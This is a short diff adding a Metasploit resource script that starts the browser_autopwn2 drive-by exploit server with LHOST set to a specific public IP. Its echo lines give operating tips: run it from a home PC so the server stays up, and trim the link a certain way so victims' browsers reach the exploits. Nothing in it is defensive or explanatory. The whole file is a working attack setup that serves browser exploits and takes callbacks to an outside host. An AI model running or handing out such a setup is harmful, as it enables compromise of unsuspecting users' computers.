@@ -1,0 +1,8 @@
+use auxiliary/server/browser_autopwn2
+echo make sure to change the local 172 IP to the 54.183.166.71 public IP
+setg LHOST 54.183.166.71
+run -j -z
+echo It is advisable to host this command FROM THE HOME PC because if you close out your SSH then the serve shuts down and needs to be restarted
+echo ONLY paste the FIRST directory of the link, NOT the second, otherwise you get a error saying Browser directly visiting the exploit URL is forbidden, 
+echo also you must exclude the last slash, otherwise it says Target has requested an unknown path
+
